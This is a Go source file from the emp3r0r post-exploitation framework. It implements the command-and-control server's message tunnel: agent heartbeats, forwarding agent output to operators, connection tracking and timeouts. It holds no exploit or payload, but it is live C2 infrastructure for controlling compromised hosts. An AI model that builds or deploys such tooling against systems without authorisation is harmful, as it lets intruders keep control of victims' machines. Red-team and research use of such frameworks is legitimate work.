package server

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleMessageTunnel processes JSON C&C tunnel connections.
func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
	lastHandshake := time.Now()
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		logging.Errorf("handleMessageTunnel: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	defer func() {
		logging.Debugf("handleMessageTunnel exiting")
		live.AgentControlMapMutex.Lock()
		for t, c := range live.AgentControlMap {
			if c.Conn == conn {
				delete(live.AgentControlMap, t)
				operatorBroadcastPrintf(logging.ERROR, "Agent dies... %s is disconnected", strconv.Quote(t.Name))
				break
			}
		}
		live.AgentControlMapMutex.Unlock()
		_ = conn.Close()
		cancel()
		logging.Debugf("handleMessageTunnel exited")
	}()
	in := json.NewDecoder(conn)
	out := json.NewEncoder(conn)
	var msg def.MsgTunData
	go func() {
		defer cancel()
		for ctx.Err() == nil {
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			cmd := ""
			if len(msg.CmdSlice) != 0 {
				cmd = msg.CmdSlice[0]
			}
			if strings.HasPrefix(cmd, "hello") {
				reply := msg
				reply.CmdSlice = msg.CmdSlice
				reply.CmdID = msg.CmdID
				reply.Response = cmd + util.RandStr(util.RandInt(1, 10))
				err = out.Encode(reply)
				if err != nil {
					logging.Warningf("Failed to answer hello to agent %s", msg.Tag)
					return
				}
				lastHandshake = time.Now()
			} else {
				// forward message to operators
				err = fwdMsg2Operators(msg)
				if err != nil {
					logging.Errorf("Failed to forward message to operator: %v", err)
					return
				}
			}
			agent := agents.GetAgentByTag(msg.Tag)
			if agent == nil {
				logging.Errorf("No agent found for message: %v", msg)
				return
			}
			shortname := agent.Name
			live.AgentControlMapMutex.Lock()
			if live.AgentControlMap[agent].Conn == nil {
				operatorBroadcastPrintf(logging.SUCCESS,
					"Knock.. Knock... Agent %s is connected",
					strconv.Quote(shortname))
			}
			live.AgentControlMap[agent].Conn = conn
			live.AgentControlMap[agent].Ctx = ctx
			live.AgentControlMap[agent].Cancel = cancel
			live.AgentControlMapMutex.Unlock()
		}
	}()
	for ctx.Err() == nil {
		if time.Since(lastHandshake) > 2*time.Minute {
			operatorBroadcastPrintf(logging.WARN, "handleMessageTunnel: timeout for agent (%s)", msg.Tag)
			return
		}
		util.TakeABlink()
	}
}

func operatorBroadcastPrintf(msg_type, format string, a ...any) (err error) {
	msgTunData := def.MsgTunData{
		Tag:      msg_type,                  // tell operator about the message type: INFO, WARN, ERROR, SUCCESS
		Response: fmt.Sprintf(format, a...), // message content
		CmdID:    "",
		CmdSlice: []string{},
	}
	return fwdMsg2Operators(msgTunData)
}

func fwdMsg2Operators(msg def.MsgTunData) (err error) {
	for operator_session_id, operator := range OPERATORS {
		if operator == nil {
			continue
		}
		if operator.conn == nil {
			continue
		}
		encoder := json.NewEncoder(operator.conn)
		err = encoder.Encode(msg)
		if err != nil {
			logging.Errorf("Failed to forward message to operator: %v", err)
			return
		}
		logging.Debugf("Forwarded message %v to operator %s", msg, operator_session_id)
	}
	return
}
